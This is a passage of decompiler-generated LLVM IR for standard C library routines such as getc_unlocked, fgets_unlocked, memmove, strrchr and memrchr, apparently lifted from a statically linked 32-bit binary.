  %v1_8065421 = add i32 %v0_8065421, 56
  store i32 %v1_8065421, i32* @ecx, align 4
  %v0_8065424 = call i32 @__lll_lock_wait_private()
  %v0_8065429 = call i32 @function_80652f2()
  ret i32 %v0_8065429
}

define i32 @_L_unlock_239() local_unnamed_addr {
entry:
  %v0_806542e = load i32, i32* @ebx, align 4
  %v1_806542e = add i32 %v0_806542e, 56
  store i32 %v1_806542e, i32* @eax, align 4
  %v0_8065431 = call i32 @__lll_unlock_wake_private()
  store i32 %v0_8065431, i32* @eax, align 4
  %v0_8065436 = call i32 @function_806535b()
  ret i32 %v0_8065436
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-5 = alloca i8, align 1
  %v0_806543c = load i32, i32* @ebx, align 4
  %v4_8065440 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8065440, i32* @ebx, align 4
  %v1_8065444 = add i32 %v4_8065440, 16
  %v2_8065444 = inttoptr i32 %v1_8065444 to i32*
  %v3_8065444 = load i32, i32* %v2_8065444, align 4
  %v2_8065447 = add i32 %v4_8065440, 24
  %v3_8065447 = inttoptr i32 %v2_8065447 to i32*
  %v4_8065447 = load i32, i32* %v3_8065447, align 4
  %v10_8065447 = icmp ult i32 %v3_8065444, %v4_8065447
  br i1 %v10_8065447, label %dec_label_pc_80654e9, label %dec_label_pc_8065450

dec_label_pc_8065450:                             ; preds = %entry
  %v2_8065450 = load i16, i16* %arg1, align 2
  %v3_8065450 = zext i16 %v2_8065450 to i32
  %v1_8065453 = and i32 %v3_8065450, 131
  %v6_806545d = icmp ugt i32 %v1_8065453, 128
  br i1 %v6_806545d, label %dec_label_pc_8065477, label %dec_label_pc_806545f

dec_label_pc_806545f:                             ; preds = %dec_label_pc_8065450
  %v0_806545f = load i32, i32* @edx, align 4
  %v6_8065467 = call i32 @__stdio_trans2r_o(i16* nonnull %arg1, i32 128, i32 %v0_806545f, i32 %v0_806545f)
  %v1_806546f = icmp eq i32 %v6_8065467, 0
  %v1_8065471 = icmp eq i1 %v1_806546f, false
  br i1 %v1_8065471, label %dec_label_pc_806550e, label %dec_label_pc_806545f.dec_label_pc_8065477_crit_edge

dec_label_pc_806545f.dec_label_pc_8065477_crit_edge: ; preds = %dec_label_pc_806545f
  %v0_8065477.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8065477

dec_label_pc_8065477:                             ; preds = %dec_label_pc_806545f.dec_label_pc_8065477_crit_edge, %dec_label_pc_8065450
  %v2_80654ab = phi i32 [ %v0_8065477.pre, %dec_label_pc_806545f.dec_label_pc_8065477_crit_edge ], [ %v4_8065440, %dec_label_pc_8065450 ]
  %v1_8065477 = inttoptr i32 %v2_80654ab to i16*
  %v2_8065477 = load i16, i16* %v1_8065477, align 2
  %v3_8065477 = zext i16 %v2_8065477 to i32
  store i32 %v3_8065477, i32* @ecx, align 4
  %v2_806547a = and i16 %v2_8065477, 2
  %v3_806547a = icmp eq i16 %v2_806547a, 0
  br i1 %v3_806547a, label %dec_label_pc_806549a, label %dec_label_pc_806547f

dec_label_pc_806547f:                             ; preds = %dec_label_pc_8065477
  %tmp = urem i16 %v2_8065477, 2
  %v1_8065481 = zext i16 %tmp to i32
  %tmp18 = sub nsw i32 0, %v1_8065481
  %v2_8065484 = and i32 %tmp18, 4
  %v3_8065484 = add i32 %v2_80654ab, 36
  %v4_8065484 = add i32 %v3_8065484, %v2_8065484
  %v5_8065484 = inttoptr i32 %v4_8065484 to i8*
  %v6_8065484 = load i8, i8* %v5_8065484, align 1
  %v7_8065484 = zext i8 %v6_8065484 to i32
  %v8_8065484 = load i32, i32* @edx, align 4
  %v9_8065484 = and i32 %v8_8065484, -256
  %v10_8065484 = or i32 %v9_8065484, %v7_8065484
  store i32 %v10_8065484, i32* %edx.global-to-local, align 4
  %v1_8065488 = add i16 %v2_8065477, -1
  store i16 %v1_8065488, i16* %v1_8065477, align 2
  %v0_806548e = load i32, i32* @ebx, align 4
  %v1_806548e = add i32 %v0_806548e, 40
  %v2_806548e = inttoptr i32 %v1_806548e to i32*
  store i32 0, i32* %v2_806548e, align 4
  %v0_8065495 = load i32, i32* %edx.global-to-local, align 4
  %v1_8065495 = urem i32 %v0_8065495, 256
  store i32 %v1_8065495, i32* @edx, align 4
  br label %dec_label_pc_8065511

dec_label_pc_806549a:                             ; preds = %dec_label_pc_8065477
  %v1_806549a = add i32 %v2_80654ab, 16
  %v2_806549a = inttoptr i32 %v1_806549a to i32*
  %v3_806549a = load i32, i32* %v2_806549a, align 4
  %v1_806549d = add i32 %v2_80654ab, 20
  %v2_806549d = inttoptr i32 %v1_806549d to i32*
  %v3_806549d = load i32, i32* %v2_806549d, align 4
  %v15_806549d = icmp eq i32 %v3_806549d, %v3_806549a
  %v1_80654a0 = icmp eq i1 %v15_806549d, false
  br i1 %v1_80654a0, label %dec_label_pc_80654e9, label %dec_label_pc_80654a2

dec_label_pc_80654a2:                             ; preds = %dec_label_pc_806549a
  %v1_80654a2 = add i32 %v2_80654ab, 4
  %v2_80654a2 = inttoptr i32 %v1_80654a2 to i32*
  %v3_80654a2 = load i32, i32* %v2_80654a2, align 4
  %v13_80654a2 = icmp eq i32 %v3_80654a2, -2
  %v1_80654a6 = icmp eq i1 %v13_80654a2, false
  br i1 %v1_80654a6, label %dec_label_pc_80654b0, label %dec_label_pc_80654a8

dec_label_pc_80654a8:                             ; preds = %dec_label_pc_80654a2
  %v1_80654a8 = or i32 %v3_8065477, 4
  store i32 %v1_80654a8, i32* @ecx, align 4
  %v1_80654ab = trunc i32 %v1_80654a8 to i16
  store i16 %v1_80654ab, i16* %v1_8065477, align 2
  br label %dec_label_pc_806550e

dec_label_pc_80654b0:                             ; preds = %dec_label_pc_80654a2
  %v3_80654b0 = and i16 %v2_8065477, 768
  %v4_80654b0 = icmp eq i16 %v3_80654b0, 0
  br i1 %v4_80654b0, label %dec_label_pc_80654c5, label %dec_label_pc_80654b5

dec_label_pc_80654b5:                             ; preds = %dec_label_pc_80654b0
  %v2_80654bd = call i32 @fflush_unlocked(i32 ptrtoint (i32** @global_var_8071920.1563 to i32))
  %v0_80654c5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80654c5

dec_label_pc_80654c5:                             ; preds = %dec_label_pc_80654b0, %dec_label_pc_80654b5
  %v0_80654fa = phi i32 [ %v2_80654ab, %dec_label_pc_80654b0 ], [ %v0_80654c5.pre, %dec_label_pc_80654b5 ]
  %v1_80654c5 = add i32 %v0_80654fa, 8
  %v2_80654c5 = inttoptr i32 %v1_80654c5 to i32*
  %v3_80654c5 = load i32, i32* %v2_80654c5, align 4
  %v1_80654c8 = add i32 %v0_80654fa, 12
  %v2_80654c8 = inttoptr i32 %v1_80654c8 to i32*
  %v3_80654c8 = load i32, i32* %v2_80654c8, align 4
  %v15_80654c8 = icmp eq i32 %v3_80654c8, %v3_80654c5
  br i1 %v15_80654c8, label %dec_label_pc_80654f2, label %dec_label_pc_80654cd

dec_label_pc_80654cd:                             ; preds = %dec_label_pc_80654c5
  %v2_80654d0 = add i32 %v0_80654fa, 24
  %v3_80654d0 = inttoptr i32 %v2_80654d0 to i32*
  store i32 %v3_80654c5, i32* %v3_80654d0, align 4
  %v0_80654d3 = load i32, i32* @ebx, align 4
  %v2_80654d4 = call i32 @__stdio_rfill(i32 %v0_80654d3)
  %v1_80654dc = icmp eq i32 %v2_80654d4, 0
  br i1 %v1_80654dc, label %dec_label_pc_806550e, label %dec_label_pc_80654e0

dec_label_pc_80654e0:                             ; preds = %dec_label_pc_80654cd
  %v0_80654e0 = load i32, i32* @ebx, align 4
  %v1_80654e0 = add i32 %v0_80654e0, 20
  %v2_80654e0 = inttoptr i32 %v1_80654e0 to i32*
  %v3_80654e0 = load i32, i32* %v2_80654e0, align 4
  %v2_80654e3 = add i32 %v0_80654e0, 24
  %v3_80654e3 = inttoptr i32 %v2_80654e3 to i32*
  store i32 %v3_80654e0, i32* %v3_80654e3, align 4
  %v0_80654e6 = load i32, i32* @ebx, align 4
  %v1_80654e6 = add i32 %v0_80654e6, 16
  %v2_80654e6 = inttoptr i32 %v1_80654e6 to i32*
  %v3_80654e6 = load i32, i32* %v2_80654e6, align 4
  br label %dec_label_pc_80654e9

dec_label_pc_80654e9:                             ; preds = %dec_label_pc_806549a, %entry, %dec_label_pc_80654e0
  %v1_80654ed = phi i32 [ %v2_80654ab, %dec_label_pc_806549a ], [ %v4_8065440, %entry ], [ %v0_80654e6, %dec_label_pc_80654e0 ]
  %v0_80654e9 = phi i32 [ %v3_806549a, %dec_label_pc_806549a ], [ %v3_8065444, %entry ], [ %v3_80654e6, %dec_label_pc_80654e0 ]
  %v1_80654e9 = inttoptr i32 %v0_80654e9 to i8*
  %v2_80654e9 = load i8, i8* %v1_80654e9, align 1
  %v3_80654e9 = zext i8 %v2_80654e9 to i32
  store i32 %v3_80654e9, i32* @edx, align 4
  %v1_80654ec = add i32 %v0_80654e9, 1
  %v2_80654ed = add i32 %v1_80654ed, 16
  %v3_80654ed = inttoptr i32 %v2_80654ed to i32*
  store i32 %v1_80654ec, i32* %v3_80654ed, align 4
  %v0_8065514.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8065511

dec_label_pc_80654f2:                             ; preds = %dec_label_pc_80654c5
  %v2_80654f5 = ptrtoint i8* %stack_var_-5 to i32
  %v5_80654fa = inttoptr i32 %v0_80654fa to i16*
  %v5_80654fb = call i32 @__stdio_READ(i16* %v5_80654fa, i32 %v2_80654f5, i32 1)
  %v1_8065503 = icmp eq i32 %v5_80654fb, 0
  br i1 %v1_8065503, label %dec_label_pc_806550e, label %dec_label_pc_8065507

dec_label_pc_8065507:                             ; preds = %dec_label_pc_80654f2
  %v3_8065507 = load i8, i8* %stack_var_-5, align 1
  %v4_8065507 = sext i8 %v3_8065507 to i32
  store i32 %v4_8065507, i32* @edx, align 4
  br label %dec_label_pc_8065511

dec_label_pc_806550e:                             ; preds = %dec_label_pc_80654f2, %dec_label_pc_80654cd, %dec_label_pc_806545f, %dec_label_pc_80654a8
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8065511

dec_label_pc_8065511:                             ; preds = %dec_label_pc_8065507, %dec_label_pc_80654e9, %dec_label_pc_806547f, %dec_label_pc_806550e
  %v0_8065514 = phi i32 [ %v4_8065507, %dec_label_pc_8065507 ], [ %v0_8065514.pre, %dec_label_pc_80654e9 ], [ %v1_8065495, %dec_label_pc_806547f ], [ -1, %dec_label_pc_806550e ]
  store i32 %v0_806543c, i32* @ebx, align 4
  ret i32 %v0_8065514

; uselistorder directives
  uselistorder i32 %v0_80654e9, { 1, 0 }
  uselistorder i32 %v3_80654c5, { 1, 0 }
  uselistorder i32 %v0_80654fa, { 0, 1, 3, 2 }
  uselistorder i32 %v3_806549a, { 1, 0 }
  uselistorder i32 %v1_8065495, { 1, 0 }
  uselistorder i16 %v2_8065477, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80654ab, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 288, { 1, 0 }
  uselistorder i32* @global_var_8071928.1560, { 1, 2, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_8065511, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_806550e, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80654e9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80654c5, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_806551a = load i32, i32* @esi, align 4
  %v0_806551b = load i32, i32* @ebx, align 4
  %v4_8065523 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8065523, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_8065523, i32* @ebx, align 4
  %tmp18 = icmp slt i32 %arg2, 1
  %tmp19 = icmp eq i1 %tmp18, false
  br i1 %tmp19, label %dec_label_pc_806556b.preheader, label %dec_label_pc_8065577

dec_label_pc_806556b.preheader:                   ; preds = %entry
  %v1_806556b21 = add i32 %arg2, -1
  %v8_806556b25 = icmp eq i32 %v1_806556b21, 0
  store i32 %v1_806556b21, i32* @esi, align 4
  %v1_806556c27 = icmp eq i1 %v8_806556b25, false
  br i1 %v1_806556c27, label %dec_label_pc_8065533, label %dec_label_pc_806556e

dec_label_pc_8065533:                             ; preds = %dec_label_pc_806556b.preheader, %dec_label_pc_8065569.dec_label_pc_806556b_crit_edge.dec_label_pc_8065533_crit_edge
  %v0_8065533 = phi i32 [ %v0_8065533.pre, %dec_label_pc_8065569.dec_label_pc_806556b_crit_edge.dec_label_pc_8065533_crit_edge ], [ %arg3, %dec_label_pc_806556b.preheader ]
  %v1_8065533 = add i32 %v0_8065533, 16
  %v2_8065533 = inttoptr i32 %v1_8065533 to i32*
  %v3_8065533 = load i32, i32* %v2_8065533, align 4
  store i32 %v3_8065533, i32* %eax.global-to-local, align 4
  %v2_8065536 = add i32 %v0_8065533, 24
  %v3_8065536 = inttoptr i32 %v2_8065536 to i32*
  %v4_8065536 = load i32, i32* %v3_8065536, align 4
  %v10_8065536 = icmp ult i32 %v3_8065533, %v4_8065536
  %v1_8065539 = icmp eq i1 %v10_8065536, false
  br i1 %v1_8065539, label %dec_label_pc_8065549, label %dec_label_pc_806553b

dec_label_pc_806553b:                             ; preds = %dec_label_pc_8065533
  %v1_806553b = inttoptr i32 %v3_8065533 to i8*
  %v2_806553b = load i8, i8* %v1_806553b, align 1
  %v3_806553b = zext i8 %v2_806553b to i32
  %v4_806553b = load i32, i32* @edx, align 4
  %v5_806553b = and i32 %v4_806553b, -256
  %v6_806553b = or i32 %v5_806553b, %v3_806553b
  store i32 %v6_806553b, i32* @edx, align 4
  %v1_806553d = add i32 %v3_8065533, 1
  store i32 %v1_806553d, i32* %eax.global-to-local, align 4
  %v2_806553e = load i32, i32* @ebx, align 4
  %v3_806553e = inttoptr i32 %v2_806553e to i8*
  store i8 %v2_806553b, i8* %v3_806553e, align 1
  %v0_8065540 = load i32, i32* @ebx, align 4
  %v1_8065540 = add i32 %v0_8065540, 1
  store i32 %v1_8065540, i32* @ebx, align 4
  %v0_8065541 = load i32, i32* @edx, align 4
  %v1_8065541 = trunc i32 %v0_8065541 to i8
  %v10_8065541 = icmp eq i8 %v1_8065541, 10
  %v0_8065544 = load i32, i32* %eax.global-to-local, align 4
  %v1_8065544 = load i32, i32* @ebp, align 4
  %v2_8065544 = add i32 %v1_8065544, 16
  %v3_8065544 = inttoptr i32 %v2_8065544 to i32*
  store i32 %v0_8065544, i32* %v3_8065544, align 4
  br i1 %v10_8065541, label %dec_label_pc_806556e, label %dec_label_pc_8065569.dec_label_pc_806556b_crit_edge

dec_label_pc_8065549:                             ; preds = %dec_label_pc_8065533
  %tmp20 = inttoptr i32 %v0_8065533 to i16*
  %v3_806554d = call i32 @getc_unlocked(i16* %tmp20)
  store i32 %v3_806554d, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v3_806554d, 16777216
  %v1_8065555 = sdiv i32 %sext, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  store i32 %v1_8065555, i32* @edx, align 4
  %v1_806555a = icmp eq i1 %tmp, false
  br i1 %v1_806555a, label %dec_label_pc_8065569, label %dec_label_pc_806555c

dec_label_pc_806555c:                             ; preds = %dec_label_pc_8065549
  %v0_806555c = load i32, i32* @ebp, align 4
  %v1_806555c = inttoptr i32 %v0_806555c to i8*
  %v2_806555c = load i8, i8* %v1_806555c, align 1
  %v3_806555c = and i8 %v2_806555c, 8
  %v4_806555c = icmp eq i8 %v3_806555c, 0
  br i1 %v4_806555c, label %dec_label_pc_806556e, label %dec_label_pc_8065577

dec_label_pc_8065569:                             ; preds = %dec_label_pc_8065549
  %v4_806554d = trunc i32 %v3_806554d to i8
  %v1_8065564 = trunc i32 %v1_8065555 to i8
  %v2_8065564 = load i32, i32* @ebx, align 4
  %v3_8065564 = inttoptr i32 %v2_8065564 to i8*
  store i8 %v1_8065564, i8* %v3_8065564, align 1
  %v0_8065566 = load i32, i32* @ebx, align 4
  %v1_8065566 = add i32 %v0_8065566, 1
  store i32 %v1_8065566, i32* @ebx, align 4
  %v11_8065567 = icmp eq i8 %v4_806554d, 10
  br i1 %v11_8065567, label %dec_label_pc_806556e, label %dec_label_pc_8065569.dec_label_pc_806556b_crit_edge

dec_label_pc_8065569.dec_label_pc_806556b_crit_edge: ; preds = %dec_label_pc_806553b, %dec_label_pc_8065569
  %v0_806556b.pre = load i32, i32* @esi, align 4
  %v1_806556b = add i32 %v0_806556b.pre, -1
  %v8_806556b = icmp eq i32 %v1_806556b, 0
  store i32 %v1_806556b, i32* @esi, align 4
  %v1_806556c = icmp eq i1 %v8_806556b, false
  br i1 %v1_806556c, label %dec_label_pc_8065569.dec_label_pc_806556b_crit_edge.dec_label_pc_8065533_crit_edge, label %dec_label_pc_806556e

dec_label_pc_8065569.dec_label_pc_806556b_crit_edge.dec_label_pc_8065533_crit_edge: ; preds = %dec_label_pc_8065569.dec_label_pc_806556b_crit_edge
  %v0_8065533.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8065533

dec_label_pc_806556e:                             ; preds = %dec_label_pc_806556b.preheader, %dec_label_pc_806553b, %dec_label_pc_8065569.dec_label_pc_806556b_crit_edge, %dec_label_pc_8065569, %dec_label_pc_806555c
  %v0_806556e = load i32, i32* @ebx, align 4
  %v1_806556e = load i32, i32* @edi, align 4
  %tmp29 = icmp ugt i32 %v0_806556e, %v1_806556e
  br i1 %tmp29, label %dec_label_pc_8065572, label %dec_label_pc_8065577

dec_label_pc_8065572:                             ; preds = %dec_label_pc_806556e
  %v1_8065572 = inttoptr i32 %v0_806556e to i8*
  store i8 0, i8* %v1_8065572, align 1
  %v0_806557c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8065579

dec_label_pc_8065577:                             ; preds = %dec_label_pc_806556e, %dec_label_pc_806555c, %entry
  br label %dec_label_pc_8065579

dec_label_pc_8065579:                             ; preds = %dec_label_pc_8065572, %dec_label_pc_8065577
  %v0_806557c = phi i32 [ %v0_806557c.pre, %dec_label_pc_8065572 ], [ 0, %dec_label_pc_8065577 ]
  store i32 %v0_806557c, i32* %eax.global-to-local, align 4
  store i32 %v0_806551b, i32* @ebx, align 4
  store i32 %v0_806551a, i32* @esi, align 4
  ret i32 %v0_806557c

; uselistorder directives
  uselistorder i32 %v0_806557c, { 1, 0 }
  uselistorder i32 %v0_806556e, { 1, 0 }
  uselistorder i32 %v1_806556b, { 1, 0 }
  uselistorder i32 %v1_8065555, { 1, 0 }
  uselistorder i32 %v3_806554d, { 1, 0, 2 }
  uselistorder i32 %v0_8065533, { 2, 1, 0 }
  uselistorder i32 (i16*)* @getc_unlocked, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8065579, { 1, 0 }
  uselistorder label %dec_label_pc_806556e, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_8065569.dec_label_pc_806556b_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8065533, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8065585 = load i32, i32* @esi, align 4
  store i32 %v0_8065585, i32* %stack_var_-8, align 4
  %v4_8065586 = ptrtoint i8* %arg1 to i32
  %v13_8065594 = icmp eq i32 %v4_8065586, %arg2
  br i1 %v13_8065594, label %dec_label_pc_80655a6, label %dec_label_pc_8065598

dec_label_pc_8065598:                             ; preds = %entry
  %v8_8065594 = icmp ult i32 %v4_8065586, %arg2
  br i1 %v8_8065594, label %dec_label_pc_80655a3, label %dec_label_pc_806559a

dec_label_pc_806559a:                             ; preds = %dec_label_pc_8065598
  %v2_806559a = add i32 %arg2, -1
  %v3_806559a = add i32 %v2_806559a, %tmp
  %v3_806559e = add i32 %v4_8065586, -1
  %v4_806559e = add i32 %v3_806559e, %tmp
  br label %dec_label_pc_80655a3

dec_label_pc_80655a3:                             ; preds = %dec_label_pc_8065598, %dec_label_pc_806559a
  %v1_80655a3 = phi i32 [ %arg2, %dec_label_pc_8065598 ], [ %v3_806559a, %dec_label_pc_806559a ]
  %v0_80655a3 = phi i32 [ %v4_8065586, %dec_label_pc_8065598 ], [ %v4_806559e, %dec_label_pc_806559a ]
  %v3_80655a3 = inttoptr i32 %v1_80655a3 to i8*
  %v4_80655a3 = inttoptr i32 %v0_80655a3 to i8*
  %v5_80655a3 = call i8* @_memcpy(i8* %v4_80655a3, i8* %v3_80655a3, i32 %tmp)
  store i1 false, i1* @df, align 1
  %v2_80655a6.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80655a6

dec_label_pc_80655a6:                             ; preds = %entry, %dec_label_pc_80655a3
  %v2_80655a6 = phi i32 [ %v0_8065585, %entry ], [ %v2_80655a6.pre, %dec_label_pc_80655a3 ]
  store i32 %v2_80655a6, i32* @esi, align 4
  ret i32 %v4_8065586

; uselistorder directives
  uselistorder i32 %v4_8065586, { 3, 1, 2, 4, 0 }
  uselistorder i32 %tmp, { 1, 2, 0 }
  uselistorder i32 %arg2, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_80655a6, { 1, 0 }
  uselistorder label %dec_label_pc_80655a3, { 1, 0 }
}

define i32 @__GI_strchrnul() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %v4_80655ad = ptrtoint i8* %tmp5 to i32
  %v2_80655b5 = mul i32 %tmp, 256
  %v3_80655b5 = and i32 %v2_80655b5, 65280
  %v4_80655b5 = and i32 %tmp, -65281
  %v5_80655b5 = or i32 %v3_80655b5, %v4_80655b5
  %v8_80655b7.pre = load i1, i1* @df, align 1
  %v9_80655b7 = select i1 %v8_80655b7.pre, i32 -1, i32 1
  br label %dec_label_pc_80655b7

dec_label_pc_80655b7:                             ; preds = %dec_label_pc_80655bc, %entry
  %v4_80655b7 = phi i32 [ %v6_80655b7, %dec_label_pc_80655bc ], [ %v5_80655b5, %entry ]
  %v7_80655b7 = phi i32 [ %v10_80655b7, %dec_label_pc_80655bc ], [ %v4_80655ad, %entry ]
  %v1_80655b7 = inttoptr i32 %v7_80655b7 to i8*
  %v2_80655b7 = load i8, i8* %v1_80655b7, align 1
  %v10_80655b7 = add i32 %v7_80655b7, %v9_80655b7
  %v3_80655b8 = udiv i32 %v4_80655b7, 256
  %v4_80655b8 = trunc i32 %v3_80655b8 to i8
  %v16_80655b8 = icmp eq i8 %v2_80655b7, %v4_80655b8
  br i1 %v16_80655b8, label %dec_label_pc_80655c0, label %dec_label_pc_80655bc

dec_label_pc_80655bc:                             ; preds = %dec_label_pc_80655b7
  %v3_80655b7 = zext i8 %v2_80655b7 to i32
  %v5_80655b7 = and i32 %v4_80655b7, -256
  %v6_80655b7 = or i32 %v3_80655b7, %v5_80655b7
  %v4_80655bc = icmp eq i8 %v2_80655b7, 0
  %v1_80655be = icmp eq i1 %v4_80655bc, false
  br i1 %v1_80655be, label %dec_label_pc_80655b7, label %dec_label_pc_80655c0

dec_label_pc_80655c0:                             ; preds = %dec_label_pc_80655bc, %dec_label_pc_80655b7
  %v1_80655c0 = add i32 %v10_80655b7, -1
  ret i32 %v1_80655c0

; uselistorder directives
  uselistorder i8 %v2_80655b7, { 1, 2, 0 }
  uselistorder i32 %v4_80655b7, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
}

define i32 @strrchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_80655c8 = ptrtoint i8* %arg1 to i32
  %v2_80655d2 = mul i32 %arg2, 256
  %v3_80655d2 = and i32 %v2_80655d2, 65280
  %v4_80655d2 = and i32 %arg2, -65281
  %v5_80655d2 = or i32 %v3_80655d2, %v4_80655d2
  br label %dec_label_pc_80655d4

dec_label_pc_80655d4:                             ; preds = %dec_label_pc_80655dc, %entry
  %v0_80655e13 = phi i32 [ %v0_80655e1, %dec_label_pc_80655dc ], [ 0, %entry ]
  %v4_80655d4 = phi i32 [ %v6_80655d4, %dec_label_pc_80655dc ], [ %v5_80655d2, %entry ]
  %v0_80655dc = phi i32 [ %v1_80655dc, %dec_label_pc_80655dc ], [ %v4_80655c8, %entry ]
  %v1_80655d4 = inttoptr i32 %v0_80655dc to i8*
  %v2_80655d4 = load i8, i8* %v1_80655d4, align 1
  %v3_80655d4 = zext i8 %v2_80655d4 to i32
  %v5_80655d4 = and i32 %v4_80655d4, -256
  %v6_80655d4 = or i32 %v3_80655d4, %v5_80655d4
  %v1_80655d6 = udiv i32 %v4_80655d4, 256
  %v2_80655d6 = trunc i32 %v1_80655d6 to i8
  %v16_80655d6 = icmp eq i8 %v2_80655d6, %v2_80655d4
  %v1_80655d8 = icmp eq i1 %v16_80655d6, false
  br i1 %v1_80655d8, label %dec_label_pc_80655dc, label %dec_label_pc_80655da

dec_label_pc_80655da:                             ; preds = %dec_label_pc_80655d4
  br label %dec_label_pc_80655dc

dec_label_pc_80655dc:                             ; preds = %dec_label_pc_80655d4, %dec_label_pc_80655da
  %v0_80655e1 = phi i32 [ %v0_80655e13, %dec_label_pc_80655d4 ], [ %v0_80655dc, %dec_label_pc_80655da ]
  %v1_80655dc = add i32 %v0_80655dc, 1
  %v4_80655dd = icmp eq i8 %v2_80655d4, 0
  %v1_80655df = icmp eq i1 %v4_80655dd, false
  br i1 %v1_80655df, label %dec_label_pc_80655d4, label %dec_label_pc_80655e1

dec_label_pc_80655e1:                             ; preds = %dec_label_pc_80655dc
  ret i32 %v0_80655e1

; uselistorder directives
  uselistorder i8 %v2_80655d4, { 1, 0, 2 }
  uselistorder i32 %v0_80655dc, { 1, 0, 2 }
  uselistorder i32 -65281, { 4, 0, 1, 2, 3 }
  uselistorder i32 65280, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80655dc, { 1, 0 }
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_80655e9 = urem i32 %arg2, 256
  %v4_80655f5 = sext i8 %arg1 to i32
  %v2_80655f9 = add i32 %v4_80655f5, %arg3
  %v1_806560b7 = icmp eq i32 %arg3, 0
  br i1 %v1_806560b7, label %dec_label_pc_8065613, label %dec_label_pc_806560f

dec_label_pc_80655fd:                             ; preds = %dec_label_pc_806560f
  %v1_80655fd = add i32 %v0_80655fd, -1
  %v5_80655fe = load i32, i32* @edx, align 4
  %v6_80655fe = and i32 %v5_80655fe, -256
  %v7_80655fe = or i32 %v6_80655fe, %v4_80655e9
  store i32 %v7_80655fe, i32* @edx, align 4
  %v1_8065602 = inttoptr i32 %v1_80655fd to i8*
  %v2_8065602 = load i8, i8* %v1_8065602, align 1
  %v15_8065602 = icmp eq i8 %v2_8065602, %tmp
  br i1 %v15_8065602, label %dec_label_pc_8065691, label %dec_label_pc_806560a

dec_label_pc_806560a:                             ; preds = %dec_label_pc_80655fd
  %v1_806560a = add i32 %v0_806560a, -1
  %v8_806560a = icmp eq i32 %v1_806560a, 0
  br i1 %v8_806560a, label %dec_label_pc_8065613, label %dec_label_pc_806560f

dec_label_pc_806560f:                             ; preds = %entry, %dec_label_pc_806560a
  %v0_806560a = phi i32 [ %v1_806560a, %dec_label_pc_806560a ], [ %arg3, %entry ]
  %v0_80655fd = phi i32 [ %v1_80655fd, %dec_label_pc_806560a ], [ %v2_80655f9, %entry ]
  %v2_806560f = urem i32 %v0_80655fd, 4
  %v3_806560f = icmp eq i32 %v2_806560f, 0
  %v1_8065611 = icmp eq i1 %v3_806560f, false
  br i1 %v1_8065611, label %dec_label_pc_80655fd, label %dec_label_pc_8065613

dec_label_pc_8065613:                             ; preds = %dec_label_pc_806560a, %dec_label_pc_806560f, %entry
  %v0_8065677.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_806560a ], [ %v0_806560a, %dec_label_pc_806560f ]
  %v0_8065618 = phi i32 [ %v2_80655f9, %entry ], [ %v1_80655fd, %dec_label_pc_806560a ], [ %v0_80655fd, %dec_label_pc_806560f ]
  store i32 %v0_8065618, i32* @ecx, align 4
  %v2_806561c = mul nuw nsw i32 %v4_80655e9, 256
  %v2_806561f = or i32 %v2_806561c, %v4_80655e9
  %v2_8065623 = mul i32 %v2_806561f, 65536
  %v2_8065626 = or i32 %v2_8065623, %v2_806561f
  %v6_806567a54 = icmp ugt i32 %v0_8065677.pr, 3
  br i1 %v6_806567a54, label %dec_label_pc_806562a, label %dec_label_pc_806567c

dec_label_pc_806562a:                             ; preds = %dec_label_pc_8065613, %dec_label_pc_8065674
  %v0_806567456 = phi i32 [ %v1_8065674, %dec_label_pc_8065674 ], [ %v0_8065677.pr, %dec_label_pc_8065613 ]
  %v0_806562a55 = phi i32 [ %v1_806562a, %dec_label_pc_8065674 ], [ %v0_8065618, %dec_label_pc_8065613 ]
  %v1_806562a = add i32 %v0_806562a55, -4
  store i32 %v1_806562a, i32* @ecx, align 4
  %v2_806562f = inttoptr i32 %v1_806562a to i32*
  %v3_806562f = load i32, i32* %v2_806562f, align 4
  %v4_806562f = xor i32 %v3_806562f, %v2_8065626
  %v1_8065633 = add i32 %v4_806562f, 2130640639
  %v1_8065638 = xor i32 %v4_806562f, -2130640640
  %v2_806563a = xor i32 %v1_8065638, %v1_8065633
